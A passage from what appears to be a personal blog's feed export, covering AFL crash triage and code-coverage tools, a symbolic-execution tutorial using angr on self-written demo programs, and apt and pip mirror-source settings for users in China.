<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Manual Mode</span></span><br><span class="line">$ ~/tools/go/bin/cwtriage -root syncdir/fuzzer1/crashes/ -match id -- /path/to/target @@</span><br><span class="line"></span><br><span class="line"><span class="comment">#AFL Mode</span></span><br><span class="line">$ ~/tools/go/bin/cwtriage -root syncdir -afl</span><br></pre></td></tr></table></figure>
<p><img src="/imghost/aafr/6.jpg" alt="crashwalk e.g."></p>
<h3 id="afl-collect"><a href="#afl-collect" class="headerlink" title="afl-collect"></a>afl-collect</h3><p>One of <a class="link"   href="https://gitlab.com/rc0r/afl-utils" >afl-utils<i class="fas fa-external-link-alt"></i></a> suite, also based on <code>exploitable</code> plugin to check availability of crash.<br>It also delete useless or duplicated crash sample </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">usage: afl-collect [-d DATABASE] [-e|-g GDB_EXPL_SCRIPT_FILE] [-f LIST_FILENAME]</span><br><span class="line"> [-h] [-j THREADS] [-m] [-r [-rt TIMEOUT]] [-rr] sync_dir collection_dir -- target_cmd</span><br><span class="line"></span><br><span class="line">the following arguments are required: </span><br><span class="line">sync_dir, collection_dir, target_cmd</span><br><span class="line"></span><br><span class="line"><span class="comment"># example</span></span><br><span class="line">$ afl-collect -j 8 -d crashes.db -e gdb_script ./afl_sync_dir ./collection_dir -- /path/to/target --target-opts</span><br></pre></td></tr></table></figure>

<p><img src="/imghost/aafr/7.jpg" alt="afl-collect e.g."></p>
<h2 id="Code-Coverage"><a href="#Code-Coverage" class="headerlink" title="Code Coverage"></a>Code Coverage</h2><p>A method to measure coverage of program, like whether a line of source code has been executed, or whether an instruction in the assembly code has been executed.</p>
<p>There’re three levels of coverage detections: function, basic-block, edge.</p>
<h3 id="Basic-Block"><a href="#Basic-Block" class="headerlink" title="Basic Block"></a>Basic Block</h3><p>A set of sequentially executed instructions.<br>Once the first instruction is executed, following instructions must be executed.</p>
<p>That means, one basic block contains only one entry and only on exit.</p>
<p>For example:<br><img src="/imghost/aafr/8.jpg" alt="code pic"></p>
<p>IDA can also divide it into four blocks:<br><img src="/imghost/aafr/9.jpg" alt="IDA view"></p>
<h3 id="Edge"><a href="#Edge" class="headerlink" title="Edge"></a>Edge</h3><p>Edge is used to represent the jump between basic blocks.<br>Just like the lines between every blocks in IDA view.</p>
<h3 id="Tuple"><a href="#Tuple" class="headerlink" title="Tuple"></a>Tuple</h3><p>In the implementation of AFL, a tuple(branch_src, branch_dst) is used to record the information of the current basic block + the previous basic block, to obtain the target execution flow and code coverage.</p>
<h3 id="Do-Caculation"><a href="#Do-Caculation" class="headerlink" title="Do Caculation"></a>Do Caculation</h3><p><code>GCOV</code> is released with gcc, with same principle of instrumentation by afl-gcc, it generates code coverage info after instrumented by gcc.</p>
<p><code>LCOV</code> is another tool and also the graph front-end of <code>GCOV</code>.</p>
<p><code>afl-cov</code> helps call two tools above to process result from afl-fuzz.</p>
<h4 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h4><p>We mainly use <code>afl-cov</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt-get install afl-cov</span><br><span class="line"><span class="comment"># this version seemes not supporting branch coverage statistics</span></span><br><span class="line"></span><br><span class="line">$ apt-get install lcov</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/mrash/afl-cov.git</span><br><span class="line">$ ./afl-cov/afl-cov -V</span><br><span class="line">$ afl-cov-0.6.2</span><br><span class="line"><span class="comment"># this way you get latest version</span></span><br></pre></td></tr></table></figure>

<h4 id="Rebuild"><a href="#Rebuild" class="headerlink" title="Rebuild"></a>Rebuild</h4><p>First use <code>gcov</code> to rebuild source.<br>Adding <code>-fprofile-arcs</code> and <code>ftest-coverage</code> to <code>CFLAGS</code>.<br>Better reassign new dir by <code>--prefix</code> so as not to cover files <code>afl-gcc</code> instrumented.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ make clean </span><br><span class="line">$ ./configure --prefix=/another/absolute/path CC=<span class="string">&quot;gcc&quot;</span> CXX=<span class="string">&quot;g++&quot;</span> CFLAGS=<span class="string">&quot;-fprofile-arcs -ftest-coverage&quot;</span> --disable-shared</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure>

<h4 id="Calculate"><a href="#Calculate" class="headerlink" title="Calculate"></a>Calculate</h4><p>Then we execute <code>afl-cov</code>.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># example</span></span><br><span class="line">$ afl-cov -d /path/to/syncdir --live --enable-branch-coverage -c . -e <span class="string">&quot;cat AFL_FILE | LD_LIBRARY_PATH=/path/to/lib /path/to/target AFL_FILE&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;-d&#x27; to assign afl-fuzz output dir</span></span><br><span class="line"><span class="comment"># &#x27;--live&#x27; used for one running fuzzer ( updating dir )</span></span><br><span class="line"><span class="comment"># &#x27;--enable-branch-coverage&#x27; used to enable edge coverage (branch coverage) statistics</span></span><br><span class="line"><span class="comment"># &#x27;-c&#x27; to assign source code dir</span></span><br><span class="line"><span class="comment"># &#x27;-e&#x27; to set running command, and in this parameter</span></span><br><span class="line"><span class="comment"># &quot;AFL_FILE&quot; functions same as &quot;@@&quot; for afl-fuzz</span></span><br><span class="line"><span class="comment"># &quot;LD_LIBRARY_PATH&quot; load specific lib</span></span><br></pre></td></tr></table></figure>
<p><img src="/imghost/aafr/10.jpg" alt="afl-cov e.g."></p>
<p>Finally we get a code coverage report in html.</p>
]]></content>
      <categories>
        <category>Fuzzing</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>fuzzing</tag>
        <tag>afl</tag>
      </tags>
  </entry>
  <entry>
    <title>Learn Symbolic Execution and angr</title>
    <url>/2020/03/05/2020-03-05-Learn-Symbolic-Execution-and-angr/</url>
    <content><![CDATA[<p>Besides Fuzzing, Symbolic Execution is another choice to approach reverse engineering and binary analysis. </p>
<h2 id="Symbolic-Execution-Intro"><a href="#Symbolic-Execution-Intro" class="headerlink" title="Symbolic Execution Intro"></a>Symbolic Execution Intro</h2><p><img src="/imghost/lse/1.png" alt="reverse engineering concept diagram"></p>
<p>This is a general reverse engineering concept diagram. </p>
<p>The second layer shows that there are multiple reverse engineering methods that fall under different categories. </p>
<p>Symbolic execution is a method that falls between static analysis and dynamic analysis.</p>
<h3 id="Basic-principle"><a href="#Basic-principle" class="headerlink" title="Basic principle"></a>Basic principle</h3><p><img src="/imghost/lse/2.png" alt="symbolic execution flow chart"></p>
<p>This is a flow chart for general symbolic execution. </p>
<p>The execution starts by creating symbolic inputs from the original binary. </p>
<p>From the inputs, paths can be deduced and each path will carry certain constraints. </p>
<p>The inputs from these constraints will then be executed upon until all paths are found.</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p><img src="/imghost/lse/3.png" alt="eg"></p>
<p>All execution paths of a program can be represented as a tree –&gt; execution tree</p>
<p>To explore paths, formally, symbolic execution maintains two variables globally:</p>
<ul>
<li>&amp;sigma; : maps variable to symbolic expression</li>
<li><code>PC</code>: symbolic path constraints</li>
</ul>
<p>When symbol execution starts, the &amp;sigma; is empty and the <code>PC</code> is true.</p>
<p>In <code>main</code> we meet a read statement whose form is <code>var = sym_input()</code>. After execution a <code>var -&gt; s</code> is added to &amp;sigma; . We will get: &amp;sigma;&#x3D;{ x-&gt;x<sub>0</sub>, y-&gt;y<sub>0</sub> }.</p>
<p>The assignment statement like <code>var = expression</code> is the same, so after line6, we get: &amp;sigma;&#x3D;{ x-&gt;x<sub>0</sub>, y-&gt;y<sub>0</sub>, z-&gt;2y<sub>0</sub> }.</p>
<p>When we meet conditional statements <code>if(e) S1 else S2</code>, two updates for <code>PC</code>.<br>Update <code>PC</code> –&gt; <code>PC</code> &amp;and; &amp;sigma;(e) to represent <code>then</code> branch.<br>Create <code>PC&#39;</code> –&gt; <code>PC</code> &amp;and; &amp;not; &amp;sigma;(e) to represent <code>else</code> branch.</p>
<p>After line 7, we get two symbolic execution instances and path constraints are: x<sub>0</sub> &#x3D; 2y<sub>0</sub>   and  x<sub>0</sub> &amp;ne; 2y<sub>0</sub><br>After line 8, Another two instances and <code>PC</code>: (x<sub>0</sub> &#x3D; 2y<sub>0</sub>) &amp;and; (x<sub>0</sub> &gt; y<sub>0</sub> + 10)  and  (x<sub>0</sub> &#x3D; 2y<sub>0</sub>) &amp;and; (x<sub>0</sub> &amp;le; y<sub>0</sub> + 10)</p>
<p>If things satisfy neither of the conditions, or program breaks, instance terminates. We can use constraint solver to generate values which leads to specific path.</p>
<p>Example above belongs to classical symbolic execution, pure static symbolic execution. There are two tricky problems resulting in its impractical: </p>
<ul>
<li>what if loop occurs?</li>
<li>what if constraint solver cannot solve?</li>
</ul>
<h3 id="Concolic-Execution"><a href="#Concolic-Execution" class="headerlink" title="Concolic Execution"></a>Concolic Execution</h3><p>Key element of modern symbolic execution technology is their ability to mix concrete execution with symbolic execution.</p>
<p><img src="/imghost/lse/4.png" alt="concolic"></p>
<p>Concolic maintains two states:<br>Concrete State: maps all variables to their concrete values.<br>Symbolic State: only maps variables that have non-concrete values.</p>
<p>We use the previous example to see this process. Concolic execution first generates some random input: {x &#x3D; A, y &#x3D; B}(A &amp;ne; 2B). </p>
<p>When it goes to the first fork, it adds x<sub>0</sub> &amp;ne; 2y<sub>0</sub> to path constraints. Then reverse conjunction, to solve x<sub>0</sub> &#x3D; 2y<sub>0<sub>.</p>
<p>We can get {x &#x3D; C, y &#x3D; 2C}. When this input reaches next fork, then it does the same as above. </p>
<p>To sum up, it’s a process of testing inputs along with generating new inputs using constraint solver. Finally we explore all feasible paths.</p>
<p>Concolic execution deals problems of classic static symbolic execution  – just replace tricky parts for solver with actual values. Meanwhile you’ll sacrifice the completeness of path exploration.</p>
<h3 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h3><p>Next let’s talk about challenges and solutions.</p>
<h4 id="Path-Explosion"><a href="#Path-Explosion" class="headerlink" title="Path Explosion"></a>Path Explosion</h4><p>Symbolic execution implicitly filtering two paths:</p>
<ul>
<li>Paths not depending on symbolic input</li>
<li>Paths without solutions for current path constraint.</li>
</ul>
<p>Though it is, path explosion is still the biggest chanllenge. There’re also two solutions:</p>
<ul>
<li>Heuristics for path-finding (heuristic search) to increase code coverage<ul>
<li>Interleave random testing (choose randomly)</li>
<li>Guided by CFG (control flow graph)</li>
<li>Combine with evolutionary search (fitness functionfor driving the exploration of the input space)</li>
</ul>
</li>
<li>Reduce execution time by parallelizing independent pathsor by merging similar paths  <ul>
<li>Merge paths statically, then feed solver</li>
<li>Record and reuse results of low-level functions</li>
<li>Pruning redundant paths</li>
</ul>
</li>
</ul>
<h4 id="Constraint-Solving"><a href="#Constraint-Solving" class="headerlink" title="Constraint Solving"></a>Constraint Solving</h4><p>It is a bottleneck in symbolic execution. The optimization of the solver (improving solving ability) has become a method to solve it.</p>
<p>Two solutions for it:</p>
<ul>
<li>Irrelevant constraint elimination</li>
<li>Incremental solution: Caching constraints that have been solved to reuse</li>
</ul>
<h4 id="Memory-Modeling"><a href="#Memory-Modeling" class="headerlink" title="Memory Modeling"></a>Memory Modeling</h4><p>Precision of translation from statements to constraints, has a significant impact on the coverage obtained by symbolic execution.</p>
<p>When accessing memory and referencing a memory unit, whose reference comes from user input, the memory address becomes an expression.</p>
<p>Sometimes it’s a question about when to set this reference a concrete value, or whether use values to approximate some variables. </p>
<p>Precision or scalability, it’s a trade-off.</p>
<p>You have to consider:</p>
<ul>
<li>Whether application code from high level, or system code from low-level</li>
<li>Practical effects of different constraint solvers</li>
</ul>
<h4 id="Handling-Concurrency"><a href="#Handling-Concurrency" class="headerlink" title="Handling Concurrency"></a>Handling Concurrency</h4><p>Large programs are usually concurrent. Because of the inherent nature of such programs, dynamic symbolic execution systems can be used to efficiently test concurrent programs, including applications for complex data entry, distributed systems, and GPGPU programs.</p>
<h2 id="angr-Intro"><a href="#angr-Intro" class="headerlink" title="angr Intro"></a>angr Intro</h2><p><code>angr</code> is a binary analysis framework developed by researchers from the Computer Security Lab at UC Santa Barbara. </p>
<p>The tool provides binary analysis information such as finding functions and generating function call graphs and it also includes a symbolic solver engine capable of performing symbolic execution. </p>
<p><code>angr</code> can be a significant part of expanding the field of reverse engineering not only because of its symbolic execution engine, but also because of its strengths as a binary analysis tool. Its ability to find functions and generate function call graphs are important to reverse engineering.</p>
<p>Documentation as <a class="link"   href="http://docs.angr.io/" >HTML<i class="fas fa-external-link-alt"></i></a> and as a <a class="link"   href="https://github.com/angr/angr-doc" >Github repository<i class="fas fa-external-link-alt"></i></a>. They are very helpful.</p>
<h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><p>It is documented in <a class="link"   href="https://docs.angr.io/introductory-errata/install" >docs.angr.io&#x2F;introductory-errata&#x2F;install<i class="fas fa-external-link-alt"></i></a>. </p>
<p>Though use <code>pip install angr</code> is pretty easy, I still recommend to get it by <code>virtualenv</code> or <code>docker</code>, which is recommended by official. There are old version lib dependencies that will mess your environment up.</p>
<p>Despite running script, using <code>IPython</code> to run command is also encouraged.</p>
<h3 id="Symbolic-Execution-Example"><a href="#Symbolic-Execution-Example" class="headerlink" title="Symbolic Execution Example"></a>Symbolic Execution Example</h3><p><img src="/imghost/lse/5.png" alt="flow chart"></p>
<p>This is a general flow chart for symbolic execution with <code>angr</code>. Begin by loading the binary with parameters, set the program state to begin at, then create the path and pathgroup to explore on.</p>
<h4 id="Simple-Solution-0x00"><a href="#Simple-Solution-0x00" class="headerlink" title="Simple Solution 0x00"></a>Simple Solution 0x00</h4><p>Here we write demo <code>check.c</code> ourselves. It contains a simple fork when guessing the string.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;success\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;here is your flag if it&#x27;s a ctf\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">failed</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;failed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> check[<span class="number">9</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,check);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(check,<span class="string">&quot;p4ssw0rd&quot;</span>))&#123;</span><br><span class="line">        <span class="built_in">success</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">failed</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Main logic is to input specific word to activate success method.<br>Now we use <code>angr</code> to analyse it.</p>
<p>You should have read <a class="link"   href="https://docs.angr.io/core-concepts" >docs.angr.io&#x2F;core-concepts<i class="fas fa-external-link-alt"></i></a> and known basic properties.<br>Then we follow the flow chart to do.</p>
<p>First we load the library</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">&quot;./check&quot;</span>,auto_load_libs=<span class="literal">False</span>) <span class="comment"># normally False</span></span><br></pre></td></tr></table></figure>
<p>If you need logging, add this</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">&#x27;angr.manager&#x27;</span>).setLevel(logging.DEBUG) </span><br></pre></td></tr></table></figure>

<p>Then set the program state to start</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">state=p.factory.entry_state()           <span class="comment"># if Project is an &quot;initialization image&quot;, here is &#x27;simulated program state&#x27;</span></span><br><span class="line">sm=p.factory.simulation_manager(state)  <span class="comment"># simulation_manager is like a simulator</span></span><br></pre></td></tr></table></figure>

<p>After that we begin to explore</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">res = sm.explore(find=<span class="keyword">lambda</span> s: <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))    <span class="comment"># explore to find path where b&#x27;flag&#x27; appears</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(res.found))                                          <span class="comment"># see if there&#x27;s a result</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(res.found) &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Your input should be: &#x27;</span>,res.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;And result looks like: &#x27;</span>,res.found[<span class="number">0</span>].posix.dumps(<span class="number">1</span>))</span><br><span class="line"><span class="comment"># the output may be messed by random bytes, because it&#x27;s a memory dump</span></span><br><span class="line"><span class="comment"># but key info exists, and in this way we find a flag </span></span><br></pre></td></tr></table></figure>

<p>Here is the final script</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">&#x27;angr.manager&#x27;</span>).setLevel(logging.DEBUG) </span><br><span class="line">p = Project(<span class="string">&quot;./check&quot;</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state=p.factory.entry_state()</span><br><span class="line">sm=p.factory.simulation_manager(state)</span><br><span class="line">res = sm.explore(find=<span class="keyword">lambda</span> s: <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))        <span class="comment"># change b&quot;flag&quot; to bytes you want </span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(res.found))                                              <span class="comment"># angr has an engine to help you</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(res.found) &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Your input should be: &#x27;</span>,res.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;And result looks like: &#x27;</span>,res.found[<span class="number">0</span>].posix.dumps(<span class="number">1</span>))</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>Output is like</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">Your input should be:  b<span class="string">&#x27;p4ssw0rd\x00J\x00\x08\x00\x02\x02\x08I\x02)\x00\x89\x06I\x02\x00\x01\x02\x01\x08\x01\x02\x00\x01\x00\x01\x00\x01\x02\x00\x08\x00\x01\x00\x02\x00\x00\x00\x00\x00\x02\x00\x02\x04\x89\x89\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">And result looks like:  b<span class="string">&quot;success\nhere is your flag if it&#x27;s a ctf\n&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="Simulation-Execution-0x01"><a href="#Simulation-Execution-0x01" class="headerlink" title="Simulation Execution 0x01"></a>Simulation Execution 0x01</h4><p>We have the same <code>check</code> to analyse, with different script</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./check&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state() </span><br><span class="line">forknum = <span class="number">2</span>                                     <span class="comment"># normally is path number when encounter a fork</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    succ = state.step()                         <span class="comment"># &#x27;state&#x27; is used like a simulator. kind of like &#x27;unicorn&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(succ.successors) == forknum:         <span class="comment"># if we meet a fork, having specific number paths to go</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    state = succ.successors[<span class="number">0</span>]                  <span class="comment"># we break the point and check state</span></span><br><span class="line"></span><br><span class="line">state1, state2 = succ.successors</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Fork 1 dump is:&#x27;</span>,state1.posix.dumps(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Fork 2 dump is:&#x27;</span>,state2.posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p>Then we can have</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Fork 1 dump is: b<span class="string">&#x27;p4ssw0rd\x00\x00\x02\x00\x02\x00\x00\x00\x00\x02\x02\x02I\x00\x02\x00\x00\x01\x02\x02\x01\x01\x02\x08\x00\x08\x00\x01\x00\x00\x00\x01\x00\x00\x19\x01\xa0\x00\x00\x00\x08\x00\x00\x00\x00\x00\x80\x08\x00\x00\x00\x01&#x27;</span></span><br><span class="line">Fork 2 dump is: b<span class="string">&#x27;\x01\x0e\x00\x00\x89\x00\x04&quot;IJ\x00\x08\x89\x00\x19\xa4I\x0e\x8a\x01\x03\x02I*J\x00\x89II\x02\x00@\x8a@\x02\x89\x89\x02\x02I\x00\x01\x08\x89\x82\x89\x00\x0f\xd9*\x19\x89\x02\x02\x01@\x02\x02\x02\x00&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="Pass-Arguments-0x02"><a href="#Pass-Arguments-0x02" class="headerlink" title="Pass Arguments 0x02"></a>Pass Arguments 0x02</h4><p>We write another demo <code>check2.c</code> to learn about passing args.<br>And we compile without <code>PIE</code> to try another way of exploring.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;hello args test&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;you win!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;you lose!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Solver engine of <code>angr</code> is called Claripy.<br>The way we pass command line arguments is </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">args = claripy.BVS(<span class="string">&quot;args&quot;</span>, <span class="number">8</span> * <span class="number">16</span>)                      </span><br><span class="line"><span class="comment"># create a bitvector symbol named &quot;args&quot; of length 8 * 16 bits</span></span><br><span class="line"><span class="comment"># state.solver.BVV(num, size) is used to set value with exact number and size</span></span><br><span class="line">state = p.factory.entry_state(args=[<span class="string">&#x27;./check2&#x27;</span>, args])  </span><br><span class="line"><span class="comment"># in this way we pass args</span></span><br></pre></td></tr></table></figure>

<p>Because we remove <code>PIE</code>, no randomization for address.<br>Use objdump to disassemble</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ objdump -D check2</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">  401153:       48 89 c7                mov    %rax,%rdi</span><br><span class="line">  401156:       e8 e5 fe ff ff          callq  401040 &lt;strcmp@plt&gt;     <span class="comment"># Here is &#x27;strcmp&#x27; call</span></span><br><span class="line">  40115b:       85 c0                   <span class="built_in">test</span>   %eax,%eax</span><br><span class="line">  40115d:       75 13                   jne    401172 &lt;main+0x40&gt;      <span class="comment"># a jump for not equal</span></span><br><span class="line">  40115f:       48 8d 3d a7 0e 00 00    lea    0xea7(%rip),%rdi        <span class="comment"># i guess it&#x27;sfor equal</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>So we can use absolute address to explore</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">sm = p.factory.simgr(state)             <span class="comment"># another way for simulation</span></span><br><span class="line">sm.explore(find=<span class="number">0x40115f</span>)               <span class="comment"># use address(when no PIE)</span></span><br><span class="line">st = sm.found[<span class="number">0</span>]                        <span class="comment"># store the result(state)</span></span><br></pre></td></tr></table></figure>

<p>And final script is</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line">p = angr.Project(<span class="string">&quot;./check2&quot;</span>)</span><br><span class="line">args = claripy.BVS(<span class="string">&quot;args&quot;</span>, <span class="number">8</span> * <span class="number">16</span>)</span><br><span class="line">state = p.factory.entry_state(args=[<span class="string">&#x27;./check2&#x27;</span>, args])</span><br><span class="line">sm = p.factory.simgr(state)</span><br><span class="line">sm.explore(find=<span class="number">0x40115f</span>)</span><br><span class="line">st = sm.found[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span> st.se.<span class="built_in">eval</span>(args,cast_to=<span class="built_in">str</span>)      <span class="comment"># solve the constraint</span></span><br></pre></td></tr></table></figure>
<p>Output is </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">g3t fl4g���</span><br></pre></td></tr></table></figure>
<p>Then we guess the key word is “g3t fl4g”</p>
<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p><code>angr</code> is not only a gadget for symbolic execution but a tool for reverse engineering.<br>What I show you here is simple implementation for simple puzzles related with symbolic execution.<br>See <a class="link"   href="https://github.com/angr/angr-doc/tree/master/examples/" >angr examples<i class="fas fa-external-link-alt"></i></a> to learn advanced techniques of <code>angr</code>.</p>
]]></content>
      <categories>
        <category>Symbolic Execution</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>python</tag>
        <tag>symbolic-execution</tag>
        <tag>angr</tag>
      </tags>
  </entry>
  <entry>
    <title>Collection for Package Sources</title>
    <url>/2020/03/18/2020-03-18-Collection-for-Package-Source/</url>
    <content><![CDATA[<p>This is for programers in China, where people are a bit inconvenient to go online (off the G^<em>F</em>^W).<br>After changing to the native source, obtaining updates gets faster. </p>
<h2 id="Change-Linux-Repository-Mirror-Sources"><a href="#Change-Linux-Repository-Mirror-Sources" class="headerlink" title="Change Linux Repository Mirror Sources"></a>Change Linux Repository Mirror Sources</h2><p>Sources can be edited in <code>/etc/apt/sources.list</code>, and you have the following sources (take kali for example) as alternatives to write in this file.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># USTC</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"># Aliyun</span><br><span class="line">#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"># TUNA</span><br><span class="line">#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line"># ZJU</span><br><span class="line">#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line"># SJTU</span><br><span class="line">#deb https://mirrors.sjtug.sjtu.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src https://mirrors.sjtug.sjtu.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"># Neusoft</span><br><span class="line">#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line"></span><br><span class="line"># NWAFU</span><br><span class="line">#deb https://mirrors.nwafu.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src https://mirrors.nwafu.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
<p>Recently we encounter “E: Some index files failed to download. They have been ignored, or old ones used instead.”.<br>Change source and delete everything under <code>/var/lib/apt/lists/</code>, then update.</p>
<p>Deal with problems about public key:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add</span><br></pre></td></tr></table></figure>
<h2 id="Change-pip-Sources"><a href="#Change-pip-Sources" class="headerlink" title="Change pip Sources"></a>Change <code>pip</code> Sources</h2><p>Temporary Way</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ pip install scrapy -i https://pypi.tuna.tsinghua.edu.cn/simple <span class="comment"># use it for once</span></span><br></pre></td></tr></table></figure>
<p>Long-term Way</p>
